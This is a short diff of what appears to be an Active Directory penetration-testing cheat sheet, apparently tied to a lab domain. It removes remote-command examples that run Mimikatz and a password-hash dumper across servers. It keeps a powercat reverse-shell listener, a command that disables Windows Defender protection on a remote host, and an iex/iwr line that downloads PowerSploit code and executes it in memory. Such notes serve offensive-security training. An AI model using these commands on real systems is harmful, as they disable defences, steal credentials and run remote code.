@@ -30,20 +30,7 @@ Listener
 ```powershell
 powercat -l -v -p 443 -t 100
 ```
-
 Run remote command
-```powershell
-$sess = New-PSSession -ComputerName dcorp-dc
-Enter-PSSession $sess
-Invoke-Command
-Invoke-Command -Scriptblock {Get-Process } -ComputerName (Get Content <list_of_servers>)
-Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
-Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
-Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
-Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content <list_of_servers>) -ArgumentList
-```
-
-Example of run remote command
 ```powershell
 $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
 Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
@@ -69,6 +56,10 @@ iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon
 ```
 
 ## Enumeration
+
+
+
+
 
 #### PowerView
 
